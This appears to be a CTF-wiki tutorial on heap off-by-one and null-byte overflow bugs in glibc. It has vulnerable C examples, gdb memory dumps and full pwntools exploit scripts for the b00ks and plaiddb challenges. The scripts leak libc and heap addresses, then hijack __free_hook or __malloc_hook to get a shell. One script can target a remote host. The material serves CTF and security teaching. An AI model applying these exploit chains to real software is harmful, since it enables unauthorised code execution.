# Off-By-One in the Heap

## Introduction

Strictly speaking, an off-by-one vulnerability is a special type of overflow vulnerability. Off-by-one refers to when a program writes to a buffer and the number of bytes written exceeds the number of bytes allocated for the buffer by exactly one byte.

## Off-By-One Vulnerability Principle

Off-by-one refers to a single-byte buffer overflow. This type of vulnerability is often related to improper boundary checks and string operations, though it is also possible that the written size just happens to be one byte too many. Improper boundary checks typically include:

- When using a loop to write data into a heap chunk, the loop count is set incorrectly (this is very common among C language beginners), causing one extra byte to be written.
- Improper string operations

Generally, a single-byte overflow is considered difficult to exploit. However, due to the lax validation of the Linux heap management mechanism ptmalloc, heap-based off-by-one vulnerabilities on Linux are not complex to exploit and can be very powerful.
Additionally, it should be noted that off-by-one can be based on various buffers, such as the stack, bss segment, etc. However, heap-based off-by-one is more common in CTF competitions. We will only discuss heap-based off-by-one here.

## Off-By-One Exploitation Ideas

1. Overflow byte is a controllable arbitrary byte: By modifying the size to cause overlap between chunk structures, it is possible to leak data from other chunks or overwrite data of other chunks. The NULL byte overflow method can also be used.
2. Overflow byte is a NULL byte: When the size is 0x100, overflowing a NULL byte can clear the `prev_in_use` bit, causing the previous chunk to be considered a free chunk. (1) At this point, the unlink method can be used (see the unlink section) for exploitation. (2) Additionally, the `prev_size` field will be activated at this point, allowing us to forge `prev_size`, thereby causing overlap between chunks. The key to this method is that during unlink, there is no check verifying that the size of the chunk found via `prev_size` matches the `prev_size` value.

In the latest version of the code, a check for the latter method in case 2 has been added, but this check was not present in version 2.28 and earlier.

```
/* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = prev_size (p);
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      /* The following two lines were added in the latest version, making the second method of case 2 unusable, but versions 2.28 and earlier are unaffected */
      if (__glibc_unlikely (chunksize(p) != prevsize))
        malloc_printerr ("corrupted size vs. prev_size while consolidating");
      unlink_chunk (av, p);
    }

```

### Example 1

```
int my_gets(char *ptr,int size)
{
    int i;
    for(i=0;i<=size;i++)
    {
        ptr[i]=getchar();
    }
    return i;
}
int main()
{
    void *chunk1,*chunk2;
    chunk1=malloc(16);
    chunk2=malloc(16);
    puts("Get Input:");
    my_gets(chunk1,16);
    return 0;
}
```

Our custom my_gets function causes an off-by-one vulnerability because the loop boundary is not properly controlled, causing one extra write iteration. This is also known as a fencepost error.

> wikipedia:
> A fencepost error (sometimes also called a telegraph pole error or lamp post error) is a type of off-by-one error. Consider the following problem:
>
>     Build a straight fence (i.e., not forming a loop), 30 meters long, with fence posts spaced 3 meters apart. How many fence posts are needed?
>
> The most intuitive answer of 10 is wrong. This fence has 10 intervals but 11 fence posts.

We use gdb to debug the program. Before input, we can see the two allocated user regions are 16-byte heap chunks:
```
0x602000:	0x0000000000000000	0x0000000000000021 <=== chunk1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000021 <=== chunk2
0x602030:	0x0000000000000000	0x0000000000000000
```
After executing my_gets and providing input, we can see the data has overflowed into the next chunk's prev_size field:
print 'A'*17
```
0x602000:	0x0000000000000000	0x0000000000000021 <=== chunk1
0x602010:	0x4141414141414141	0x4141414141414141
0x602020:	0x0000000000000041	0x0000000000000021 <=== chunk2
0x602030:	0x0000000000000000	0x0000000000000000
```

### Example 2

The second common scenario that leads to off-by-one is string operations. The common cause is miscalculation of the string terminator.

```
int main(void)
{
    char buffer[40]="";
    void *chunk1;
    chunk1=malloc(24);
    puts("Get Input");
    gets(buffer);
    if(strlen(buffer)==24)
    {
        strcpy(chunk1,buffer);
    }
    return 0;

}
```

At first glance, the program appears to have no issues (not considering stack overflow), and many people probably write code like this in practice.
However, the inconsistent behavior between strlen and strcpy leads to an off-by-one. strlen is a familiar function for calculating the length of an ASCII string. This function does not include the null terminator `'\x00'` when calculating string length, but strcpy copies the null terminator `'\x00'` when copying strings. This results in 25 bytes being written to chunk1. We can observe this using gdb for debugging.

```
0x602000:	0x0000000000000000	0x0000000000000021 <=== chunk1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000411 <=== next chunk
```

After entering 'A'*24 and executing strcpy:

```
0x602000:	0x0000000000000000	0x0000000000000021
0x602010:	0x4141414141414141	0x4141414141414141
0x602020:	0x4141414141414141	0x0000000000000400
```

We can see that the low byte of the next chunk's size field has been overwritten by the null terminator `'\x00'`. This is a sub-category of off-by-one called NULL byte off-by-one. We will see the difference between off-by-one and NULL byte off-by-one in exploitation later.
One more thing to note is why the low byte is overwritten — because the byte order of CPUs we typically use is little-endian. For example, a DWORD value is stored in little-endian memory like this:

```
DWORD 0x41424344
Memory  0x44,0x43,0x42,0x41
```

### After libc-2.29
Due to the addition of these two lines of code:
```cpp
      if (__glibc_unlikely (chunksize(p) != prevsize))
        malloc_printerr ("corrupted size vs. prev_size while consolidating");
```
Since it is difficult for us to control the size field of a real chunk, the traditional off-by-null method becomes ineffective. However, we only need the chunk being unlinked to be adjacent to the next chunk, so we can still forge a fake_chunk.

The way to forge it is by using the fd_nextsize and bk_nextsize pointers left over from the large bin. Using fd_nextsize as the fake_chunk's fd and bk_nextsize as the fake_chunk's bk, we can fully control the fake_chunk's size field (this process will corrupt the original large bin chunk's fd pointer, but that doesn't matter), and we can also control its fd (by partially overwriting fd_nextsize). By using other chunks afterwards to assist in the forgery, we can pass the following check:

```
  if (__glibc_unlikely (chunksize(p) != prevsize))
    malloc_printerr ("corrupted size vs. prev_size while consolidating");
```

Then we just need to pass the unlink check, which is `fd->bk == p && bk->fd == p`.

If there is only one chunk in the large bin, then both nextsize pointers of that chunk will point to itself, as shown below:

![](./figure/largebin-struct.png)


We can control fd_nextsize to point to any address on the heap. It can easily be made to point to a fastbin + 0x10 - 0x18, and the fd in the fastbin will also point to an address on the heap. By partially overwriting this pointer, we can make it point to the previous large bin + 0x10, thus passing the `fd->bk == p` check.

Since we cannot modify bk_nextsize, bk->fd must be at the fd pointer location of the original large bin chunk (this fd was corrupted by us). Through the linked list characteristics of fastbin, we can modify this pointer without affecting other data, and then partially overwrite it to pass the `bk->fd==p` check.

Then, by using off-by-one to merge towards lower addresses, we can achieve chunk overlapping. After that, we can leak libc_base and heap addresses, and use tcache to target __free_hook.

It is difficult to understand by just explaining the theory. It is recommended to study along with challenges, such as Example 3 in this article.

## Example 1: Asis CTF 2016 [b00ks](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/off_by_one/Asis_2016_b00ks)


### Challenge Introduction


The challenge is a typical menu-based program with the functionality of a book management system.

```
1. Create a book
2. Delete a book
3. Edit a book
4. Print book detail
5. Change current author name
6. Exit
```

The program provides functions to create, delete, edit, and print books. It is a 64-bit program with the following protections:

```
Canary                        : No
NX                            : Yes
PIE                           : Yes
Fortify                       : No
RelRO                         : Full
```

Each time the program creates a book, it allocates a 0x20-byte structure to maintain its information.

```
struct book
{
    int id;
    char *name;
    char *description;
    int size;
}
```

### create

The book structure contains name and description, both allocated on the heap. First, the name buffer is allocated using malloc with a custom size, but no larger than 32.

```
printf("\nEnter book name size: ", *(_QWORD *)&size);
__isoc99_scanf("%d", &size);
printf("Enter book name (Max 32 chars): ", &size);
ptr = malloc(size);
```

Then the description is allocated, also with a custom size but no limit.

```
printf("\nEnter book description size: ", *(_QWORD *)&size);
        __isoc99_scanf("%d", &size);

v5 = malloc(size);
```

Then memory for the book structure is allocated:

```
book = malloc(0x20uLL);
if ( book )
{
    *((_DWORD *)book + 6) = size;
    *((_QWORD *)off_202010 + v2) = book;
    *((_QWORD *)book + 2) = description;
    *((_QWORD *)book + 1) = name;
    *(_DWORD *)book = ++unk_202024;
    return 0LL;
}
```

### Vulnerability

The program's custom read function contains a null byte off-by-one vulnerability. Careful observation of this read function reveals that the boundary handling is improper.

```
signed __int64 __fastcall my_read(_BYTE *ptr, int number)
{
  int i; // [rsp+14h] [rbp-Ch]
  _BYTE *buf; // [rsp+18h] [rbp-8h]

  if ( number <= 0 )
    return 0LL;
  buf = ptr;
  for ( i = 0; ; ++i )
  {
    if ( (unsigned int)read(0, buf, 1uLL) != 1 )
      return 1LL;
    if ( *buf == '\n' )
      break;
    ++buf;
    if ( i == number )
      break;
  }
  *buf = 0;
  return 0LL;
}
```

### Exploitation

#### Leak


Because the program's my_read function has a null byte off-by-one, the null terminator '\x00' read by my_read is actually written to position 0x555555756060. When a book pointer is written to 0x555555756060~0x555555756068, it will overwrite the null terminator '\x00', so there is an address leak vulnerability here. By printing the author name, we can obtain the value of the first entry in the pointer array.

```
0x555555756040:	0x6161616161616161	0x6161616161616161
0x555555756050:	0x6161616161616161	0x6161616161616161   <== author name
0x555555756060:	0x0000555555757480 <== pointer array	0x0000000000000000
0x555555756070:	0x0000000000000000	0x0000000000000000
0x555555756080:	0x0000000000000000	0x0000000000000000
```

To achieve the leak, we first need to input 32 bytes in the author name so that the null terminator is overwritten. Then we create book1, whose pointer will overwrite the last NULL byte in the author name, connecting the pointer directly with the author name. This way, outputting the author name will give us a heap pointer.

```
io.recvuntil('Enter author name:') # input author name
io.sendline('a' * 32)

io.recvuntil('>') # create book1
io.sendline('1')
io.recvuntil('Enter book name size:')
io.sendline('32')
io.recvuntil('Enter book name (Max 32 chars):')
io.sendline('object1')
io.recvuntil('Enter book description size:')
io.sendline('32')
io.recvuntil('Enter book description:')
io.sendline('object1')

io.recvuntil('>') # print book1
io.sendline('4')
io.recvuntil('Author:')
io.recvuntil('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa') # <== leak book1
book1_addr = io.recv(6)
book1_addr = book1_addr.ljust(8,'\x00')
book1_addr = u64(book1_addr)
```


#### Off-by-one Overwriting the Low Byte of a Pointer

The program also provides a change function, which is used to modify the author name. So through change, we can write into the author name and use off-by-one to overwrite the low byte of the first entry in the pointer array.


After overwriting the low byte of the book1 pointer, this pointer will point to book1's description. Since the program provides an edit function that allows arbitrary modification of the description's content, we can pre-arrange data in the description to forge a book structure whose description and name pointers can be directly controlled.

```
def off_by_one(addr):
    addr += 58
    io.recvuntil('>')# create fake book in description
    io.sendline('3')
    fake_book_data = p64(0x1) + p64(addr) + p64(addr) + pack(0xffff)
    io.recvuntil('Enter new book description:')
    io.sendline(fake_book_data) # <== fake book


    io.recvuntil('>') # change author name
    io.sendline('5')
    io.recvuntil('Enter author name:')
    io.sendline('a' * 32) # <== off-by-one
```

Here we forged a book in the description using the data p64(0x1)+p64(addr)+p64(addr)+pack(0xffff).
Where addr+58 is to make the pointer point to the address of book2's pointer, allowing us to arbitrarily modify these pointer values.


#### Exploitation via the Stack

Through the previous 2 parts, we have already obtained arbitrary address read/write capability. Readers may think the following operations are obvious, such as writing the GOT table to hijack the control flow or writing __malloc_hook to hijack the control flow, etc. However, the special aspect of this challenge is that PIE is enabled and there is no way to leak the libc base address, so we need to think of other approaches.

The clever aspect of this challenge is that when allocating the second book, a very large size is used, causing the heap to expand using mmap mode. We know that the heap has two expansion methods: one is brk, which directly extends the original heap, and the other is mmap, which maps a separate memory region.

Here we request a very large chunk to use mmap for memory expansion. Because the memory allocated by mmap has a fixed offset from libc, we can calculate the libc base address.
```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/ 桌面 /123/123
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/ 桌面 /123/123
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/ 桌面 /123/123
0x00007f8d638a3000 0x00007f8d63a63000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f8d63a63000 0x00007f8d63c63000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f8d63c63000 0x00007f8d63c67000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f8d63c67000 0x00007f8d63c69000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f8d63c69000 0x00007f8d63c6d000 0x0000000000000000 rw-
0x00007f8d63c6d000 0x00007f8d63c93000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f8d63e54000 0x00007f8d63e79000 0x0000000000000000 rw- <=== mmap
0x00007f8d63e92000 0x00007f8d63e93000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f8d63e93000 0x00007f8d63e94000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f8d63e94000 0x00007f8d63e95000 0x0000000000000000 rw-
0x00007ffdc4f12000 0x00007ffdc4f33000 0x0000000000000000 rw- [stack]
0x00007ffdc4f7a000 0x00007ffdc4f7d000 0x0000000000000000 r-- [vvar]
0x00007ffdc4f7d000 0x00007ffdc4f7f000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/ 桌面 /123/123
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/ 桌面 /123/123
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/ 桌面 /123/123
0x00007f6572703000 0x00007f65728c3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f65728c3000 0x00007f6572ac3000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f6572ac3000 0x00007f6572ac7000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f6572ac7000 0x00007f6572ac9000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f6572ac9000 0x00007f6572acd000 0x0000000000000000 rw-
0x00007f6572acd000 0x00007f6572af3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f6572cb4000 0x00007f6572cd9000 0x0000000000000000 rw- <=== mmap
0x00007f6572cf2000 0x00007f6572cf3000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f6572cf3000 0x00007f6572cf4000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f6572cf4000 0x00007f6572cf5000 0x0000000000000000 rw-
0x00007fffec566000 0x00007fffec587000 0x0000000000000000 rw- [stack]
0x00007fffec59c000 0x00007fffec59f000 0x0000000000000000 r-- [vvar]
0x00007fffec59f000 0x00007fffec5a1000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

#### exploit

```python
from pwn import *
context.log_level="info"

binary = ELF("b00ks")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
io = process("./b00ks")


def createbook(name_size, name, des_size, des):
	io.readuntil("> ")
	io.sendline("1")
	io.readuntil(": ")
	io.sendline(str(name_size))
	io.readuntil(": ")
	io.sendline(name)
	io.readuntil(": ")
	io.sendline(str(des_size))
	io.readuntil(": ")
	io.sendline(des)

def printbook(id):
	io.readuntil("> ")
	io.sendline("4")
	io.readuntil(": ")
	for i in range(id):
		book_id = int(io.readline()[:-1])
		io.readuntil(": ")
		book_name = io.readline()[:-1]
		io.readuntil(": ")
		book_des = io.readline()[:-1]
		io.readuntil(": ")
		book_author = io.readline()[:-1]
	return book_id, book_name, book_des, book_author

def createname(name):
	io.readuntil("name: ")
	io.sendline(name)

def changename(name):
	io.readuntil("> ")
	io.sendline("5")
	io.readuntil(": ")
	io.sendline(name)

def editbook(book_id, new_des):
	io.readuntil("> ")
	io.sendline("3")
	io.readuntil(": ")
	io.writeline(str(book_id))
	io.readuntil(": ")
	io.sendline(new_des)

def deletebook(book_id):
	io.readuntil("> ")
	io.sendline("2")
	io.readuntil(": ")
	io.sendline(str(book_id))

createname("A" * 32)
createbook(128, "a", 32, "a")
createbook(0x21000, "a", 0x21000, "b")


book_id_1, book_name, book_des, book_author = printbook(1)
book1_addr = u64(book_author[32:32+6].ljust(8,'\x00'))
log.success("book1_address:" + hex(book1_addr))

payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)
editbook(book_id_1, payload)
changename("A" * 32)

book_id_1, book_name, book_des, book_author = printbook(1)
book2_name_addr = u64(book_name.ljust(8,"\x00"))
book2_des_addr = u64(book_des.ljust(8,"\x00"))
log.success("book2 name addr:" + hex(book2_name_addr))
log.success("book2 des addr:" + hex(book2_des_addr))
libc_base = book2_des_addr - 0x5b9010
log.success("libc base:" + hex(libc_base))

free_hook = libc_base + libc.symbols["__free_hook"]
one_gadget = libc_base + 0x4f322 # 0x4f2c5 0x10a38c 0x4f322
log.success("free_hook:" + hex(free_hook))
log.success("one_gadget:" + hex(one_gadget))
editbook(1, p64(free_hook) * 2)
editbook(2, p64(one_gadget))

deletebook(2)

io.interactive()
```

#### Concise Approach

After achieving arbitrary read/write, another approach to find libc is to first cause a libc address to be written onto the heap before performing arbitrary read/write, and then use arbitrary read to read it out.

To find the offset where libc resides, you can directly debug with gdb and check the specific location of the libc address on the heap, without needing to deliberately calculate it.

The exp is as follows:

```
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
# vim:fenc=utf-8

import sys
import os
import os.path
from pwn import *
context(os='linux', arch='amd64', log_level='debug')

if len(sys.argv) > 2:
    DEBUG = 0
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])

    p = remote(HOST, PORT)
else:
    DEBUG = 1
    if len(sys.argv) == 2:
        PATH = sys.argv[1]

    p = process(PATH)

def cmd(choice):
    p.recvuntil('> ')
    p.sendline(str(choice))


def create(book_size, book_name, desc_size, desc):
    cmd(1)
    p.recvuntil(': ')
    p.sendline(str(book_size))
    p.recvuntil(': ')
    if len(book_name) == book_size:
        p.send(book_name)
    else:
        p.sendline(book_name)
    p.recvuntil(': ')
    p.sendline(str(desc_size))
    p.recvuntil(': ')
    if len(desc) == desc_size:
        p.send(desc)
    else:
        p.sendline(desc)


def remove(idx):
    cmd(2)
    p.recvuntil(': ')
    p.sendline(str(idx))


def edit(idx, desc):
    cmd(3)
    p.recvuntil(': ')
    p.sendline(str(idx))
    p.recvuntil(': ')
    p.send(desc)


def author_name(author):
    cmd(5)
    p.recvuntil(': ')
    p.send(author)


libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def main():
    # Your exploit script goes here

    # leak heap address
    p.recvuntil('name: ')
    p.sendline('x' * (0x20 - 5) + 'leak:')

    create(0x20, 'tmp a', 0x20, 'b') # 1
    cmd(4)
    p.recvuntil('Author: ')
    p.recvuntil('leak:')
    heap_leak = u64(p.recvline().strip().ljust(8, '\x00'))
    p.info('heap leak @ 0x%x' % heap_leak)
    heap_base = heap_leak - 0x1080

    create(0x20, 'buf 1', 0x20, 'desc buf') # 2
    create(0x20, 'buf 2', 0x20, 'desc buf 2') # 3
    remove(2)
    remove(3)

    ptr = heap_base + 0x1180
    payload = p64(0) + p64(0x101) + p64(ptr - 0x18) + p64(ptr - 0x10) + '\x00' * 0xe0 + p64(0x100)
    create(0x20, 'name', 0x108, 'overflow') # 4
    create(0x20, 'name', 0x100 - 0x10, 'target') # 5
    create(0x20, '/bin/sh\x00', 0x200, 'to arbitrary read write') # 6

    edit(4, payload) # overflow
    remove(5) # unlink

    edit(4, p64(0x30) + p64(4) + p64(heap_base + 0x11a0) + p64(heap_base + 0x10c0) + '\n')

    def write_to(addr, content, size):
        edit(4, p64(addr) + p64(size + 0x100) + '\n')
        edit(6, content + '\n')

    def read_at(addr):
        edit(4, p64(addr) + '\n')
        cmd(4)
        p.recvuntil('Description: ')
        p.recvuntil('Description: ')
        p.recvuntil('Description: ')
        content = p.recvline()[:-1]
        p.info(content)
        return content

    libc_leak = u64(read_at(heap_base + 0x11e0).ljust(8, '\x00')) - 0x3c4b78
    p.info('libc leak @ 0x%x' % libc_leak)

    write_to(libc_leak + libc.symbols['__free_hook'], p64(libc_leak + libc.symbols['system']), 0x10)
    remove(6)

    p.interactive()

if __name__ == '__main__':
    main()
```

## Example 2: plaidctf 2015 plaiddb

```shell
➜  2015_plaidctf_datastore git:(master) file datastore
datastore: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=1a031710225e93b0b5985477c73653846c352add, stripped
➜  2015_plaidctf_datastore git:(master) checksec datastore
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/off_by_one/2015_plaidctf_datastore/datastore'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
➜  2015_plaidctf_datastore git:(master)
```

As we can see, the program is a 64-bit dynamically linked binary with all protections enabled.

### Functionality Analysis

Key data structure:

```
struct Node {
    char *key;
    long data_size;
    char *data;
    struct Node *left;
    struct Node *right;
    long dummy;
    long dummy1;
}
```

It primarily uses a binary tree structure to store data. The specific storage process does not actually affect the exploitation.

The function that needs attention is `getline` (a custom single-line reading function):

```
char *__fastcall getline(__int64 a1, __int64 a2)
{
  char *v2; // r12
  char *v3; // rbx
  size_t v4; // r14
  char v5; // al
  char v6; // bp
  signed __int64 v7; // r13
  char *v8; // rax

  v2 = (char *)malloc(8uLL); // Initially allocates using malloc(8)
  v3 = v2;
  v4 = malloc_usable_size(v2); // Calculates the usable size; for malloc(8), this should be 24
  while ( 1 )
  {
    v5 = _IO_getc(stdin);
    v6 = v5;
    if ( v5 == -1 )
      bye();
    if ( v5 == 10 )
      break;
    v7 = v3 - v2;
    if ( v4 <= v3 - v2 )
    {
      v8 = (char *)realloc(v2, 2 * v4); // When size is insufficient, doubles the usable size and reallocs
      v2 = v8;
      if ( !v8 )
      {
        puts("FATAL: Out of memory");
        exit(-1);
      }
      v3 = &v8[v7];
      v4 = malloc_usable_size(v8);
    }
    *v3++ = v6; // <--- Vulnerability here: v3 as an index points to the next position; if all positions are used up, it will point to the next position that should not be writable
  }
  *v3 = 0; // <--- Vulnerability here: off by one (NULL byte overflow)
  return v2;
}
```

Several main functions:

```
unsigned __int64 main_fn()
{
  char v1[8]; // [rsp+0h] [rbp-18h]
  unsigned __int64 v2; // [rsp+8h] [rbp-10h]

  v2 = __readfsqword(0x28u);
  puts("PROMPT: Enter command:");
  gets_checked(v1, 8LL);
  if ( !strcmp(v1, "GET\n") )
  {
    cmd_get();
  }
  else if ( !strcmp(v1, "PUT\n") )
  {
    cmd_put();
  }
  else if ( !strcmp(v1, "DUMP\n") )
  {
    cmd_dump();
  }
  else if ( !strcmp(v1, "DEL\n") )
  {
    cmd_del();
  }
  else
  {
    if ( !strcmp(v1, "EXIT\n") )
      bye();
    __printf_chk(1LL, "ERROR: '%s' is not a valid command.\n", v1);
  }
  return __readfsqword(0x28u) ^ v2;
}
```

Both `dump` and `get` are used to read content, so both the `key` and the actual data can be read out—they don't need much focus. The focus should be on `put` and `del`:

```
__int64 __fastcall cmd_put()
{
  __int64 v0; // rsi
  Node *row; // rbx
  unsigned __int64 sz; // rax
  char *v3; // rax
  __int64 v4; // rbp
  __int64 result; // rax
  __int64 v6; // [rsp+0h] [rbp-38h]
  unsigned __int64 v7; // [rsp+18h] [rbp-20h]

  v7 = __readfsqword(0x28u);
  row = (Node *)malloc(0x38uLL);
  if ( !row )
  {
    puts("FATAL: Can't allocate a row");
    exit(-1);
  }
  puts("PROMPT: Enter row key:");
  row->key = getline((__int64)"PROMPT: Enter row key:", v0);
  puts("PROMPT: Enter data size:");
  gets_checked((char *)&v6, 16LL);
  sz = strtoul((const char *)&v6, 0LL, 0);
  row->data_size = sz;
  v3 = (char *)malloc(sz);
  row->data = v3;
  if ( v3 )
  {
    puts("PROMPT: Enter data:");
    fread_checked(row->data, row->data_size);
    v4 = insert_node(row);
    if ( v4 )
    {
      free(row->key);
      free(*(void **)(v4 + 16));
      *(_QWORD *)(v4 + 8) = row->data_size;
      *(_QWORD *)(v4 + 16) = row->data;
      free(row);
      puts("INFO: Update successful.");
    }
    else
    {
      puts("INFO: Insert successful.");
    }
    result = __readfsqword(0x28u) ^ v7;
  }
  else
  {
    puts("ERROR: Can't store that much data.");
    free(row->key);
    free(row);
  }
  return result;
}
```

The allocation process involves:

1. malloc(0x38) (for the structure)
2. getline (malloc and realloc)
3. malloc(size) with controllable size
4. Reading size bytes of content

The more complex parts can be examined later to see if they are needed, specifically the `free`-related parts used in put.

For deletion, the function is rather complex, so we won't explain it in detail. In fact, you only need to know that it deletes by key, and the key is read using `getline`. If the key doesn't exist, the `getline` part won't be deleted; if it does exist, items are freed sequentially.

### Vulnerability Exploitation Analysis

The location of the vulnerability has already been pointed out in the functionality analysis—it's in `getline`. However, what's special about this function is that the allocation size gradually increases by doubling the usable size, using `realloc`. In other words, to trigger this vulnerability, we need to meet specific size requirements.

Based on the allocation process, the sizes that satisfy the requirements are:

* 0x18
* 0x38
* 0x78
* 0xf8
* 0x1f8
* ...

All these sizes can trigger the overflow.

Now we need to determine the specific exploitation method. First, the `off-by-one` vulnerability can cause heap overlap, which can leak libc addresses. The exploitation method to use afterward, since heap overlap already exists (which essentially creates a UAF), can leverage common UAF techniques.

The simplest method for a UAF vulnerability is of course fastbin attack, so I used fastbin attack.

At this point, we can start thinking about how to create the conditions needed for exploitation. The ultimate effect of `off-by-one` is to merge a freed smallbin chunk or unsortedbin chunk all the way to the overflowed chunk into one large chunk. In other words:

```
+------------+
|            |  <-- freed unsortedbin or smallbin chunk (because at this point fd and bk point to valid pointers, enabling unlink)
+------------+
|     ...    |  <-- arbitrary chunks
+------------+
|            |  <-- the overflowing chunk
+------------+
|    vuln    |  <-- the overflowed chunk, with size 0x_00 (e.g., 0x100, 0x200…)
+------------+
```

After `off-by-one` exploitation, all the chunks shown above will be merged into a single freed chunk. If any of the middle arbitrary chunks are allocated, this creates an overlap.

Following our exploitation approach, combined with the challenge's `getline` function allocation method of `malloc(8)` then `realloc`, we need:

1. At least one allocated chunk in the arbitrary chunk area that can have its data read out to leak the libc address
2. The overflowing chunk must be allocated before the topmost chunk; otherwise `malloc(8)` would allocate at the top instead of where the overflowing chunk should be
3. At least one freed chunk of size 0x71 in the arbitrary chunk area for fastbin attack
4. No chunk should be merged into top, so there should be an allocated chunk at the bottom to maintain distance from the top chunk
5. The overflowing chunk's size should belong to unsortedbin or smallbin, not fastbin; otherwise after being freed, according to `getline`'s allocation method, `malloc(8)` cannot allocate at that position

Based on the above principles, we can design the chunk layout as follows:

```
+------------+
|      1     |  <-- freed chunk with size == 0x200
+------------+
|      2     |  <-- size == 0x60 fastbin chunk, allocated and readable
+------------+
|      5     |  <-- size == 0x71 fastbin chunk, prepared for fastbin attack
+------------+
|      3     |  <-- size == 0x1f8 freed smallbin/unsortedbin chunk
+------------+
|      4     |  <-- size == 0x101 overflowed chunk
+------------+
|      X     |  <-- any allocated chunk to prevent top chunk merging
+------------+
```

Since the allocation process also involves some extra structures (the structure itself allocation and `getline`), we need to free enough fastbin chunks first to prevent the structure allocation from interfering with our process.

After that, we free 5, 3, 1 in order, then use the `getline` from the `del` input to fill 3, causing the `off-by-one`. Then we `free` chunk 4 to trigger merging (with a forged `prev_size`), giving us an overlapping heap structure.

The subsequent process is even simpler: first allocate the size of chunk 1, causing the libc address to be written into chunk 2, which allows us to leak the address. Then allocate chunk 5 and write the needed content for the fastbin attack.

### exploit

Since the original libc is version 2.19, loading it caused some strange issues and was rather troublesome. Since this challenge doesn't use any features unique to 2.19, I used libc 2.23 for debugging, version ubuntu10.

```python
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
# vim:fenc=utf-8

import sys
import os
import os.path
from pwn import *
context(os='linux', arch='amd64', log_level='debug')

if len(sys.argv) > 2:
    DEBUG = 0
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])

    p = remote(HOST, PORT)
else:
    DEBUG = 1
    if len(sys.argv) == 2:
        PATH = sys.argv[1]

    p = process(PATH)


libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # ubuntu 16.04

def cmd(command_num):
    p.recvuntil('command:')
    p.sendline(str(command_num))


def put(key, size, data):
    cmd('PUT')
    p.recvuntil('key:')
    p.sendline(key)

    p.recvuntil('size:')
    p.sendline(str(size))
    p.recvuntil('data:')
    if len(data) < size:
        p.send(data.ljust(size, '\x00'))
    else:
        p.send(data)


def delete(key):
    cmd('DEL')
    p.recvuntil('key:')
    p.sendline(key)


def get(key):
    cmd('GET')
    p.recvuntil('key:')
    p.sendline(key)
    p.recvuntil('[')
    num = int(p.recvuntil(' bytes').strip(' bytes'))
    p.recvuntil(':\n')
    return p.recv(num)


def main():
    # avoid complicity of structure malloc
    for i in range(10):
        put(str(i), 0x38, str(i))
        
    for i in range(10):
        delete(str(i))

    # allocate what we want in order
    put('1', 0x200, '1')
    put('2', 0x50, '2')
    put('5', 0x68, '6')
    put('3', 0x1f8, '3')
    put('4', 0xf0, '4')
    put('defense', 0x400, 'defense-data')


    # free those need to be freed
    delete('5')
    delete('3')
    delete('1')

    delete('a' * 0x1f0 + p64(0x4e0))

    delete('4')

    put('0x200', 0x200, 'fillup')
    put('0x200 fillup', 0x200, 'fillup again')

    libc_leak = u64(get('2')[:6].ljust(8, '\x00'))
    p.info('libc leak: 0x%x' % libc_leak)
    
    libc_base = libc_leak - 0x3c4b78

    p.info('libc_base: 0x%x' % libc_base)

    put('fastatk', 0x100, 'a' * 0x58 + p64(0x71) + p64(libc_base + libc.symbols['__malloc_hook'] - 0x10 + 5 - 8))
    put('prepare', 0x68, 'prepare data')

    one_gadget = libc_base + 0x4526a
    put('attack', 0x68, 'a' * 3 + p64(one_gadget))

    p.sendline('DEL') # malloc(8) triggers one_gadget

    p.interactive()

if __name__ == '__main__':
    main()
```
